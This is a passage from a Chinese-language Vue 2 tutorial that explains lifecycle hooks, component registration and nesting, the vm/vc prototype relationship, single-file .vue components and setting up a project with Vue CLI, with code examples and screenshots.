    <h3>计数器：{{counter}}</h3>
    <button @click="add">点我加1</button>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : 'Vue生命周期',
            counter: 1,
        },
        methods: {
            add() {
                this.counter ++;
            }
        },
        // 1.创建阶段
        beforeCreate() {
            // 创建前
            console.log('beforeCreate')
        },
        created() {
            // 创建后
            console.log('created')
        },
        // 2.挂载阶段
        beforeMount() {
            // 挂载前
            console.log('beforeMount')
        },
        mounted() {
            // 挂载后
            console.log('mounted')
        },
        // 3.更新阶段
        beforeUpdate() {
            // 更新前
            console.log('beforeUpdate')
        },
        updated() {
            // 更新后
            console.log('updated')
        },
        // 4.销毁阶段
        beforeDestroy() {
            // 销毁前
            console.log('beforeDestroy')
        },
        destroyed() {
            // 销毁后
            console.log('destroyed')
        },
    })
</script>
```

counter 变化一次，就是一次更新阶段：

![image-20240427153334344](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271533542.png)

销毁阶段只能在销毁 Vue 实例时，要销毁 Vue 实例，要调用 `$destory()` 方法：

```html
<div id="app">
        <h1>{{msg}}</h1>
        <h3>计数器：{{counter}}</h3>
        <button @click="add">点我加1</button>
        <button @click="destroy">点我销毁</button>
    </div>
<script>
    const vm = new Vue({
        el: '#app',
        data: {
            msg: 'Vue生命周期',
            counter: 1,
        },
        methods: {
            add() {
                this.counter++;
            },
            destroy() {
                this.$destroy();
            }
        },
        // 1.创建阶段
        beforeCreate() {
            // 创建前
            console.log('beforeCreate')
        },
        created() {
            // 创建后
            console.log('created')
        },
        // 2.挂载阶段
        beforeMount() {
            // 挂载前
            console.log('beforeMount')
        },
        mounted() {
            // 挂载后
            console.log('mounted')
        },
        // 3.更新阶段
        beforeUpdate() {
            // 更新前
            console.log('beforeUpdate')
        },
        updated() {
            // 更新后
            console.log('updated')
        },
        // 4.销毁阶段
        beforeDestroy() {
            // 销毁前
            console.log('beforeDestroy')
        },
        destroyed() {
            // 销毁后
            console.log('destroyed')
        },
    })
</script>
```

![image-20240427153904842](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271539072.png)

销毁后，再点击 +1 就没有效果了。

### 初始阶段

![image-20240427154517635](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271545894.png)

根据图可以看出，这个 beforeCreate 的 create 指的是“数据代理&数据监测”的创建，而不是 Vue 实例的创建。

那在 beforeCreate 钩子函数中，此时数据代理还没有创建，所以此时应该是访问不了 data 中的数据的，在以上的代码中可以测试一下：

```js
// 1.创建阶段
beforeCreate() {
    // 创建前
    console.log('beforeCreate', this.counter)
},
created() {
    // 创建后
    console.log('created', this.counter)
},
```

![image-20240427154833297](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271548517.png)

所以，创建前指的是：数据代理和数据监测的创建前。此时还无法访问 data 当中的数据。包括 methods 也是无法访问的。

创建后表示数据代理和数据监测创建完毕，可以访问 data 中的数据了。可以访问 methods 了。

created 钩子函数过后，有两个连续判断

+ el 有，template 也有，最终编译 template 模板语句。
  + 此时 el 指定的挂载位置就是个占位符，会用 template 的内容覆盖掉 el 指定位置的内容
+ el 有，template 没有，最终编译 el 模板语句。
+ el 没有的时候，需要手动调用 vm.$mount(el) 进行手动挂载，然后流程才能继续。此时如果 template 有，最终编译 template 模板语句。
  + 没有 el 指定挂载位置，就需要使用 `vm.$mount(#app)` 这样手动挂载
+ el 没有的时候，需要手动调用 vm.$mount(el) 进行手动挂载，然后流程才能继续。此时如果没有 template，最终编译 el 模板语句。

结论：

+ 流程要想继续：el 必须存在。
+ el 和 template 同时存在，优先选择 template。如果没有 template，才会选择 el。

### 挂载阶段

将生成的虚拟 dom 变成真实的 dom，并且放在页面上。

![image-20240427160234929](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271602146.png)

图中这个 $el 就是真实的 dom，可以输出看看：

```js
mounted() {
    // 挂载后
    console.log('mounted')
    console.log(this.$el)
    console.log(this.$el instanceof HTMLElement)
},
```

![image-20240427184429917](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271844128.png)

如果在 beforeMount() 运行期间操作了 dom 元素，页面上是不会生效的，因为会被真实的 dom 覆盖掉；在 mounted() 运行期间操作了 dom 元素，页面上是会生效的。

在 beforeMount() 中打上断点：

```js
beforeMount() {
    // 挂载前
    console.log('beforeMount')
    debugger
},
```

此时页面停在此处，因为还未将 Vue 实例挂载，所以页面上显示出胡子语法源代码：

![image-20240427184847189](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271848425.png)

接着打开控制台，在控制台里操作现在的 dom 元素：

![image-20240427184958296](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271849524.png)

此时页面上显示的就是 haha，此时继续执行程序的话，haha 还是会被覆盖掉的：

![image-20240427185040162](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271850381.png)

而如果是在 mounted() 期间修改 dom 元素的话，则是真的修改：

```js
mounted() {
    // 挂载后
    console.log('mounted')
    console.log(this.$el)
    console.log(this.$el instanceof HTMLElement)
    debugger
},
```

![image-20240427185202814](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271852043.png)

继续向后执行后，页面没有变化：

![image-20240427185229373](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271852594.png)

### 更新阶段

只有当 data 中的数据变化了，才会进入更新阶段。

![image-20240427185514826](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271855043.png)

beforeUpdate() 此时是更新前，该更新指的是页面的更新，在内存中的数据已经改变了，但是还没有更新到页面上。

```js
beforeUpdate() {
    // 更新前
    console.log('beforeUpdate')
    debugger
},
```

此时点击页面上的按钮将 counter 加 1 后，可以看到页面上还没有改，但是内存中已经改了：

![image-20240427193718215](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271937459.png)

beforeUpdate() 后，新旧 dom 通过 diff 算法进行比对，页面会发生变化。

updated() 此时页面已经更新完毕了。

### 销毁阶段

要进入销毁阶段，必须手动调用 vm.$destroy() 方法。

![image-20240427193859870](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271939124.png)

在执行销毁函数后，在控制台中输出 vm ，发现 Vue 实例还存在：

![image-20240427194123965](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271941208.png)

所以这个销毁的意思是：将 Vue 实例上的监视器、子组件、自定义事件监听器等都解绑了。而不是将 vm 从内存空间中释放了。所以这个销毁也可以叫做解绑。

注意：如果使用的是 Vue 版本较高的话，销毁时移除的不只是 自定义事件监听器，还会将普通的事件监听器也移除了；如果版本较低，就只移除 自定义事件监听器。

观察一下解绑前后的 vm 有啥区别：

```js
beforeDestroy() {
    // 销毁前
    console.log('beforeDestroy')
    console.log(this)
    debugger
},
    destroyed() {
        // 销毁后
        console.log('destroyed')
        console.log(this)
        debugger
    },
```

在 beforeDestroy 中的断点停下时，查看 vm 中的 `_watcher` ，此时是激活状态：

![image-20240427195124190](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271951400.png)

向下执行，断点停到 destroyed 中，此时 vm 中的  `_watcher` 是未激活状态：

![image-20240427195235804](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271952017.png)

说明确实卸载了监听器。

另外，虽然在 beforeDestroy 函数中，监视器等还没有被销毁，但是也不能使用：

```js
watch : {
    counter(){
        console.log('counter被监视一次！')
    }
},
    beforeDestroy() {
        // 销毁前
        console.log('beforeDestroy')
        console.log(this)
        // 虽然在卸载前 vm 还和事件监听器等有联系，但是不能使用，以下代码会让内存中的数据变化，但是页面不会修改
        this.counter = 1000
    },
```

在销毁前的钩子中修改了被监视的 counter，但是监视器并没有起作用，而内存中的值确实已改变：

![image-20240427195613173](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404271956400.png)

另外，该修改也没有进入更新阶段，没有更新页面。

# Vue组件化开发

## 组件和组件化

### 组件化开发

![image-20240427201015722](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404272010998.png)

观察以上两个网页中，都分为了多个部分，其中有多个部分都是两个页面都有的部分，不同的部分就是主体部分。而传统开发中，独立的每一部分都会有自己的 js 和 css 文件，所以就会有上图右边的一个结构。

这种开发方式有些缺点：

+ 关系纵横交织，复杂，牵一发动全身，不利于维护。
+ 代码虽然复用，但复用率不高。

而组件化开发就是将传统开发中的公用的部分看成是一个组件：

![image-20240427201556803](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404272015062.png)

使用组件化方式开发解决了以上的两个问题：

+ 每一个组件都有独立的 js，独立的 css，这些独立的 js 和 css 只供当前组件使用，不存在纵横交错。更加便于维护。
+ 代码复用性增强。组件不仅让 js css 复用了，HTML 代码片段也复用了（因为要使用组件直接引入组件即可）。

### 组件

组件：实现应用中局部功能的代码和资源的集合。凡是采用组件方式开发的应用都可以称为组件化应用。

模块：一个大的 js 文件按照模块化拆分规则进行拆分，生成多个 js 文件，每一个 js 文件叫做模块。凡是采用模块方式开发的应用都可以称为模块化应用。

任何一个组件中都可以包含这些资源：HTML CSS JS 图片 声音 视频等。从这个角度也可以说明组件是可以包括模块的。

![image-20240427202342075](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404272023295.png)

在 Vue 中根组件就是 vm。因此每一个组件也是一个 Vue 实例。

## 第一个组件

当前程序：

```html
<body>
   <div id="app">
        <h1>{{msg}}</h1>
        <ul>
            <li v-for="(user, idx) of users" :key="user.id">
                {{idx}},{{user.name}}
            </li>
        </ul>
    </div>
<script>
    const vm = new Vue({
        el: '#app',
        data: {
            msg: '第一个组件',
            users: [
                { id: '001', name: 'jack' },
                { id: '002', name: 'lucy' },
                { id: '003', name: 'james' }
            ]
        },
    })
</script>
```

![image-20240427202816659](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404272028873.png)

现在将这个列表改为组件的方式。

组件的使用分为三步：

+ 第一步：创建组件

  ```js
  Vue.extend({该配置项和new Vue的配置项几乎相同，略有差别})
  ```

  Vue.extend 可以省略。

  区别有哪些？

  + 创建 Vue 组件的时候，配置项中不能使用 el 配置项。（但是需要使用 template 配置项来配置模板语句。）
  + 配置项中的 data 不能使用直接对象的形式，必须使用 function。这样保证多个地方使用这个组件的对象时，一个地方修改了属性值不会影响其他地方的这个属性值

+ 第二步：注册组件 

  局部注册：在配置项当中使用 components，

  ```js
  components : {
      组件的名字 : 组件对象
  }
  ```

  全局注册：

  ```js
  Vue.component('组件的名字', 组件对象)
  ```

+ 第三步：使用组件

创建一个组件：

```js
const myComponent = Vue.extend({
    template : `
            <ul>
                <li v-for="(user,index) of users" :key="user.id">
                    {{index}},{{user.name}}
                </li>
            </ul>
            `,
    data(){
        return {
            users : [
                {id:'001',name:'jack'},
                {id:'002',name:'lucy'},
                {id:'003',name:'james'}
            ]
        }
    }
})
```

+ el 项是用来指定挂载位置的，且只能由 new Vue 实例来使用，组件中不能使用 el 配置项，因为组件没有通过 new 来创建，且组件不需要固定挂载位置，哪里需要用就引入
+ data 写成函数的形式，保证每一个需要用到的地方都会调用 data 函数，拿到一个新的数据对象，这样多个地方自己操作自己的数据对象，互不影响

注册组件：在 vm 中注册组件，使用 components 配置项

局部注册

```js
const vm = new Vue({
    el : '#app',
    data : {
        msg : '第一个组件'
    },
    components : {
        // userlist是组件的名字。myComponent只是一个变量名。
        userlist : myComponent,
    }
})
```

使用组件：以 html 标签的形式使用组件

```html
<userlist></userlist>
```

所以第一个组件的完整写法;

```html
<div id="app">
    <h1>{{msg}}</h1>
    <userlist></userlist>
    <userlist></userlist>
</div>
<script>
    const myComponent = Vue.extend({
        template: `
            <ul>
                <li v-for="(user,index) of users" :key="user.id">
                    {{index}},{{user.name}}
    </li>
    </ul>
            `,
        data() {
            return {
                users: [
                    { id: '001', name: 'jack' },
                    { id: '002', name: 'lucy' },
                    { id: '003', name: 'james' }
                ]
            }
        }
    })
    const vm = new Vue({
        el: '#app',
        data: {
            msg: '第一个组件'
        },
        components: {
            // userlist是组件的名字。myComponent只是一个变量名。
            userlist: myComponent,
        }
    })
</script>
```

![image-20240427205001435](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404272050670.png)

## 全局组件和细节

**一个html中能否有多个组件？**可以。

再实现一个用户登录的组件：

```js
const userLoginComponent = {
    template : `
            <div>
                <h3>用户登录</h3>
                <form @submit.prevent="login">
                    账号：<input type="text" v-model="username"> <br><br>
                    密码：<input type="password" v-model="password"> <br><br>
                    <button>登录</button>
                </form>
            </div>
            `,
    data(){
        return {
            username : '',
            password : ''
        }
    },
    methods: {
        login(){
            alert(this.username + "," + this.password)
        }
    },
}
```

注册组件：

```js
const vm = new Vue({
    el : '#app',
    data : {
        msg : '第一个组件'
    },
    // 2. 注册组件（局部注册）
    components : {
        // userlist是组件的名字。myComponent只是一个变量名。
        userlist : myComponent,
        userlogin : userLoginComponent
    }
})
```

使用组件：

```html
<userlogin></userlogin>
```

![image-20240427211921134](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404272119382.png)

打开 Vue 开发者工具：

![image-20240427212115580](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404272121846.png)

+ 开发者工具中的组件名字是大写开头，不用管

root 就是跟组件 vm，下面管理了很多个组件。

**全局组件**

```js
Vue.component('userlogin', userLoginComponent)
```

全局注册的组件可以使用在多个 Vue 实例中。

**将组件写为单标签**

```html
<userlogin />
```

写成这样没有问题，页面能正常显示，但是写多个的话，只显示出来一个：

```html
<userlogin />
<userlogin />
<userlogin />
<userlogin />
```

这是因为：在 Vue 当中是可以使用自闭合标签的，但是前提必须在脚手架环境中使用。

**Vue.extend省略**

 在创建组件的时候 Vue.extend() 可以省略，但是底层实际上还是会调用的，在注册组件的时候会调用。

```js
const myComponent = {
    template : `
            <ul>
                <li v-for="(user,index) of users" :key="user.id">
                    {{index}},{{user.name}}
                </li>
            </ul>
            `,
    data(){
        return {
            users : [
                {id:'001',name:'jack'},
                {id:'002',name:'lucy'},
                {id:'003',name:'james'}
            ]
        }
    }
}
```

**组件的名字**

第一种：全部小写

```js
Vue.component('helloworld', {
    name : 'Xxxxx',
    template : `<h1>测试组件的名字%%%%%</h1>`
})
```

第二种：首字母大写，后面都是小写

```js
Vue.component('Helloworld', {
    name : 'Xxxxx',
    template : `<h1>测试组件的名字%%%%%</h1>`
})
```

第三种：kebab-case命名法（串式命名法。例如：user-login）

```js
Vue.component('hello-world', {
    name : 'Xxxxx',
    template : `<h1>测试组件的名字%%%%%</h1>`
})
```

第四种：CamelCase命名法（驼峰式命名法。例如：UserLogin），但是这种方式只允许在脚手架环境中使用。

```js
Vue.component('HelloWorld', {
    name : 'Xxxxx',
    template : `<h1>测试组件的名字%%%%%</h1>`
})
```

这种如果没有脚手架的情况下使用，

```html
<HelloWorld></HelloWorld>
```

会报错：会去找 helloworld 的组件

![image-20240427213436661](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404272134920.png)

+ 但是如果使用驼峰命名法没有脚手架的话，还可以使用 hello-world 来调用

  ```html
  <hello-world></hello-world>
  ```

注意：不要使用 HTML 内置的标签名作为组件的名字。

**vue开发者工具中的组件名字**

在创建组件的时候，通过配置项配置一个 name，这个 name 不是组件的名字，是设置 Vue 开发者工具中显示的组件的名字。

```js
Vue.component('hello-world', {
    name : 'Xxxxx',
    template : `<h1>测试组件的名字%%%%%</h1>`
})
```

![image-20240427214000202](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404272140461.png)

## 组件的嵌套

现有一个 app 组件：

```	html
<div id="root">
    <app></app>
</div>
<script>
    // 创建app组件
    const app = {
        template : `
                <div>
                    <h1>App组件</h1>
    			</div>
            `,
    }
    // vm
    const vm = new Vue({
        el : '#root',
        // 注册app组件
        components : {
            app : app
        }
    })
</script>
```

![image-20240428094836730](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404280948096.png)

现要在 app 组件中嵌套一个 x 组件：

```html
<div id="root">
    <app></app>
</div>
<script>
    // 创建X组件
    const x = {
        template : `
                <div>
                    <h2>X组件</h2>
    			</div>
            `,
    }
    // 创建app组件
    const app = {
        template : `
                <div>
                    <h1>App组件</h1>
                    <x></x>
    			</div>
            `,
        components: {
            x : x
        }
    }
    // vm
    const vm = new Vue({
        el : '#root',
        // 注册app组件
        components : {
            app : app
        }
    })
</script>
```

+ x 组件挂载在 app 组件中，就只能在 app 组件中使用

![image-20240428095133864](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404280951073.png)

还可以在 x 组件下挂载一个 x1 组件，也可以在 app 组件下注册一个 y 组件，这个 y 组件是和 x 组件平级的，嵌套的方法就是注册组件、注册组件、使用组件。

```html
<div id="root">
    <app></app>
</div>
```

这一段代码其实可以简化，只需要保留 Vue 实例挂载的元素即可，将组件使用写在 vm 的 template 模板中：

```html
<div id="root"></div>
<script>
    // vm
    const vm = new Vue({
        el : '#root',
        template: `
                    <app></app>
                `,
        // 注册app组件
        components : {
            app : app
        }
    })
</script>
```

另外对象中，key 和 value 同名的话，所以注册组件就可以省略为：

```js
const vm = new Vue({
    el: '#root',
    template: `
                    <app></app>
                `,
    // 注册app组件
    components: {
        app
    }
})
```

另外注册子组件时注意：子组件要注册在父组件之前，否则页面渲染到了父组件时找不到子组件；嵌套的子组件只能使用在父组件的 template 模板语句中

```html
<div id="root"></div>
<script>
    // 创建Y1组件
    const y1 = {
        template : `
                <div>
                    <h3>Y1组件</h3>
    </div>
            `
    }
    // 创建X1组件
    const x1 = {
        template : `
                <div>
                    <h3>X1组件</h3>
    </div>
            `
    }
    // 创建Y组件
    const y = {
        template : `
                <div>
                    <h2>Y组件</h2>
                    <y1></y1>
    </div>
            `,
        components : {y1}
    }
    // 创建X组件
    const x = {
        template : `
                <div>
                    <h2>X组件</h2>
                    <x1></x1>
    </div>
            `,
        components : {x1}
    }
    // 创建app组件
    const app = {
        template : `
                <div>
                    <h1>App组件</h1>
                    <x></x>
                    <y></y>
    </div>
            `,
        // 注册X组件
        components : {x,y}
    }
    // vm
    const vm = new Vue({
        el : '#root',
        template : `
                <app></app>
            `,
        // 注册app组件
        components : {app}
    })
</script>
```

## vm与vc

VueComponent 简称 vc。

### this

创建一个 Vue 实例和一个组件，在 mounted 钩子函数中打印出他们的 this 比较：

```html
<div id="app">
    <h1>{{msg}}</h1>
    <!-- 在使用 user 时，就会创建 user 的实例对象    -->
    <user></user>
</div>
<script>
	// 创建组件
    const user = Vue.extend({
        template : `
            <div>
                <h1>user组件</h1>
    		</div>
            `,
        mounted(){
            console.log('vc', this)
        }
    })
    // vm
    const vm = new Vue({
        el : '#app',
        data : {
            msg : 'vm与vc'
        },
        components : {
            user
        },
        mounted() {
            console.log('vm', this)
        },
    })
</script>
```

![image-20240428100819456](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404281008668.png)

+ Vue.extend 中的 this是 VueComponent 实例
+ new Vue 中的 this 是 Vue 实例

打开 Vue 的实例中的 children 属性查看，当前有一个 child 就是这个 user 组件：

![image-20240428101056822](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404281010032.png)

vm 与 vc 的关系可以这样说：

+ vm 有的 vc 不一定有
+ vc 有的 vm 一定有
+ vc 是 vm 的子

在 new Vue 中，this 就是 vm，那在 Vue.extend 中，this 是 user 吗？不是：

```js
const user = Vue.extend({
    template : `
            <div>
                <h1>user组件</h1>
    		</div>
            `,
    mounted(){
        console.log('vc', this === user)
    }
})
```

![image-20240428101401248](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404281014450.png)

那这个 user 是什么东西，就要看 Vue.extend 这个方法结束后的返回值。在源码中，找到这一部分：

![image-20240428101616948](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404281016161.png)

这个 Sub 是 VueComponent 构造函数，而这个 Vue.extend 方法最终返回的结果就是这个 Sub：

![image-20240428101932654](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404281019868.png)

所以 Vue.extend 这个函数每次返回的是一个全新的 VueComponent 构造函数。

```js
console.log(user);
```

![image-20240428102150880](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404281021091.png)

那么 user 就是一个构造函数，有这个构造函数就可以通过 user 创建对象

```js
console.log('user', new user()); 
```

![image-20240428104806193](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404281048409.png)

创建这个对象是 Vue 框架自己创建的，是在使用 user 时，就会创建 user 的实例对象

```html
<user></user>
```

### 原型属性

关于 `prototype ` 和  `__proto__`：

+  prototype ：每个函数对象（包括构造函数）都有一个 prototype 属性，它是一个对象。

  prototype 属性用于定义对象的方法和属性，这些方法和属性可以被该函数构造的实例继承。

  当你创建一个自定义构造函数，该构造函数的 prototype 属性上的属性和方法将被新创建的实例继承。

+ `__proto__` ：`__proto__` 是每个对象都具有的属性，它指向对象的原型。

  通过 `__proto__ ` 属性，你可以访问和修改对象的原型链，它允许对象在运行时动态继承属性和方法。

  `__proto__` 属性通常不应该被直接访问，因为它是非标准的属性。

+  prototype 是用函数对象调用

+  `__proto__` 是用对象调用

有一个构造函数：

```js
function Vip(){}
```

+ 函数本身又是一种类型，代表 Vip 类型

Vip 类型/ Vip 构造函数，有一个 prototype 属性。这个 prototype 属性可以称为：显式的原型属性。通过这个显式的原型属性可以获取：原型对象

```js
let x = Vip.prototype
```

通过 Vip 可以创建实例

```js
let a = new Vip()
```

对于实例来说，都有一个隐式的原型属性: `__proto__`。

注意：显式的(建议程序员使用的)。隐式的（不建议程序员使用的。）

这种方式也可以获取到Vip的原型对象

```js
let y = a.__proto__
```

原型对象只有一个，其实原型对象都是共享的

```js
console.log(x === y) // true
```

![image-20240428202016219](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404282020490.png)

那么原型对象有什么用呢？

现在通过 Vip 给原型 Vip 类的原型对象扩展一个属性：

```js
// 这个不是给Vip扩展属性
// 是在给“Vip的原型对象”扩展属性
Vip.prototype.counter = 1000
```

然后通过 a 实例可以访问这个扩展的 counter 属性吗？

```js
console.log(a.counter)
```

是可以访问到的。本质上是：

```js
console.log(a.__proto__counter)
```

访问原理：首先去 a 实例上找 counter 属性，如果 a 实例上没有 counter 属性的话，会沿着 `__proto__` 这个原型对象去找。

以上代码看起来表面上是 a 上有一个 counter 属性，实际上不是 a 实例上的属性，是 a 实例对应的原型对象上的属性 counter。

### 通过vc访问vm原型上的属性

给 Vue 的原型扩展一个属性：

```js
Vue.prototype.counter = 1000
```

可以通过 vm 来访问到这个属性：

```js
console.log('vm.counter', vm.counter)
```

试试用 vc 是否能访问到：

```js
const user = Vue.extend({
    template : `
            <div>
                <h1>user组件</h1>
            </div>
            `,
    mounted(){
        console.log('vc.counter', this.counter)
    }
})
```

![image-20240428203436408](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404282034644.png)

是可以访问到的。因为 counter 是 Vue 的原型对象上的属性，而 vc 的原型对象是 Vue， Vue 上没有 counter 这个属性，它就会去找 Vue 的原型对象上的 counter 属性。

这样设计是为了代码复用。在 Vue 的原型对象中有很多属性和方法，在 vc 中就不用重新定义了。

底层实现原理：

```js
VueComponent.prototype.__proto__ = Vue.prototype
```

![image-20240428204413622](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404282044859.png)

## 单文件组件

在上面的组件嵌套中，一个文件中定义了多个组件。

但在实际开发中，一个组件对应一个单独的文件，并且每个文件的扩展名都是 `.vue` ，这是 Vue 框架规定的，只有 Vue 框架能够认识，浏览器无法直接打开运行。

单文件组件的文件名命名规范和组件名的命名规范相同：

+ 全部小写：userlist
+ 首字母大写，后面全部小写：Userlist
+ kebab-case 命名法：user-list
+ CamelCase 命名法：UserList

.vue 文件的内容包括三块：

+ 结构：`<template>HTML代码</template>`
+ 交互：`<script>JS代码</script>`
+ 样式：`<style>CSS代码</style>`

将之前的组件嵌套的例子改造为单文件组件的形式。

比如之前的 y1 组件：

```js
const y1 = {
            template : `
                <div>
                    <h3>Y1组件</h3>
                </div>
            `
        }
```

新建一个 Y1.vue 文件，里面包括三块：

```vue
<template></template>

<script></script>

<style></style>
```

直接将之前的 y1 组件的代码复制到 script 块中，将原来 template 配置项中的代码复制到 template 区域：

```vue
<template>
	<div>
    	<h3>Y1组件</h3>
    </div>
</template>

<script>
    const y1 = {
        
    }
</script>

<style></style>
```

定义完组件后，需要将组件导出去，这样其他组件才能使用这个组件，使用 export 导出 y1，y1 就是一个 `{}` 对象，所以可以直接导出这个对象： 

```vue
<template>
	<div>
    	<h3>Y1组件</h3>
    </div>
</template>

<script>
    // 默认导出
    export default {
        
    }
</script>

<style></style>
```

还有之前的 y 组件：

```js
const y = {
    template : `
                <div>
                    <h2>Y组件</h2>
                    <y1></y1>
                </div>
            `,
    components : {y1}
}
```

新建一个 Y.vue ：

```vue
<template>
    <div>
        <h2>Y组件</h2>
        <!-- 使用组件 -->
        <Y1></Y1>
    </div>
</template>

<script>
    import Y1 from './Y1.vue'
    export default {
        // 注册组件
        components : {Y1}
    }
</script>
```

在组件中使用了其他组件，需要先导入组件：

```js
import 其他名字 from './x.vue'
```

+ 这里的其他名字可以随意写，使用的时候也是用这个名字
+ 去掉 `.vue` 扩展名也可以

比如 y 组件中导入 y1 组件：

```js
import Y1 from './Y1.vue'
```

导入组件后，就可以在组件中注册组件：下面注册组件的名字和上面这 import 后的名字要一致

```js
export default {
    // 注册组件
    components : {Y1}
}
```

注册组件后就要使用组件，在 template 中的 html 代码中使用：

```html
<template>
    <div>
        <h2>Y组件</h2>
        <!-- 使用组件 -->
        <Y1></Y1>
    </div>
</template>
```

所以使用一个组件还是三步：

+ 创建组件：创建一个 vue 文件，并使用 export 导出
+ 注册组件：引入 vue 文件，并在 export 中使用 components 注册组件
+ 使用组件：直接在 template 中的使用

还有其他的组件，比如 app 组件：

```vue
<template>
    <div>
        <h1>App组件</h1>
        <!-- 使用组件 -->
        <X></X>
        <Y></Y>
    </div>
</template>

<script>
    import X from './X.vue'
    import Y from './Y.vue'
    export default {
        // 注册组件
        components : {X, Y}
    }
</script>
```

还有一部分的 js 代码，就是创建 Vue 实例 vm 的代码，这部分代码一般写在另一个文件中。

新建一个 main.js 文件，然后将创建 Vue 实例的代码写在这里面，main.js 是入口文件：

```js
import App from './App.vue'

new Vue({
    el : '#root',
    // 使用组件
    template : `<App></App>`,
    // 注册App组件
    components : {App}
})

// main.js 为入口文件
```

还有 Vue 实例挂载的位置，和安装 Vue 的代码，这些代码还是需要写在一个 html 文件中。

新建一个 index.html 文件：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>单文件组件</title>
</head>
<body>
    <div id="root"></div>
    <script src="../js/vue.js"></script>
    <script src="./main.js"></script>
</body>
</html>
```

然后此时运行这个 index.html 文件，报错：

![image-20240428215223352](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404282152581.png)

这是因为浏览器不支持 ES6 的模块化开发，需要 Vue 的脚手架 Vue CLI，脚手架会将 vue 文件转换成浏览器能看懂的 html、css、js，并且脚手架还会将这些代码自动放在服务器上，启动脚手架后，服务器就启动了，就可以访问了。

此时的程序运行的流程：

+ 第一步：浏览器打开index.html页面，加载容器

+ 第二步：加载 vue.js 文件，有了 Vue

+ 第三步：加载 main.js

  + import App from ‘./App.vue’

  + import X from './X.vue'

  + import X1 from './X1.vue'

  + import Y from './Y.vue'

  + import Y1 from './Y1.vue'

    这样就完成了所有组件以及子组件的创建和注册。

+ 第四步：创建Vue实例vm，编译模板语句，渲染。

## Vue脚手架

Vue 的脚手架（Vue CLI: Command Line Interface）是 Vue 官方提供的标准化开发平台。它可以将我们 .vue 的代码进行编译生成 html css js 代码，并且可以将这些代码自动发布到它自带的服务器上，为我们 Vue 的开发提供了一条龙服务。

脚手架官网地址：https://cli.vuejs.org/zh

注意：Vue CLI 4.x 需要 Node.js v8.9 及以上版本，推荐 v10 以上。

### 安装

安装 Vue 脚手架前，先确保 npm 能用，也就是说要先安装 node.js：

![image-20240429074814397](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404290748111.png)

安装脚手架，在 dos 窗口中：

①　建议先配置一下 npm 镜像：

1) npm config set registry https://registry.npm.taobao.org
2) npm config get registry 返回成功，表示设置成功

②　第一步：安装脚手架（全局方式：表示只需要做一次即可）

1) npm install -g @vue/cli 
2) 安装完成后，重新打开 DOS 命令窗口，输入 vue 命令可用表示成功了

### 创建项目

创建项目（项目中自带脚手架环境，自带一个HelloWorld案例）

1) 切换到要创建项目的目录，然后使用命令 

   ```
   vue create zsm_vue
   ```

   会进入以下界面：

   ![image-20240429075824140](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404290758345.png)

   babel 是 ES6 转为 ES5 需要用到的，eslint 是检查语法的。

2. 现在按下键选择 Vue 2，然后回车，开始创建：

   ![image-20240429080028439](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404290800659.png)

   项目创建好后，在 src 下就自带了一个案例，在 components 中有一个 HelloWorld.vue 文件

   ![image-20240429080316315](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404290803534.png)

3. 编译 Vue 程序，自动将生成 html css js 放入内置服务器，自动启动服务。

   在项目的根目录下执行：

   ```
   npm run serve
   ```

   ![image-20240429080550649](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404290805876.png)

   然后访问如图的两个地址，都可以打开项目：

   ![image-20240429080718271](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404290807449.png)

### 认识脚手架结构

使用 vscode 打开刚刚创建的项目，分析结构。

![image-20240429081003600](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404290810827.png)

+ node_modules：脚手架的依赖包，不要动
+ public：不会被打包，也就是说现在是什么样，将来发布后放在 dist 文件夹中还是什么样

主要关注 src 目录，以后写代码就是在该目录下。

+ src 下的 assets 也是存放静态资源，和 public 目录不一样的地方是，assets 下的资源会被打包
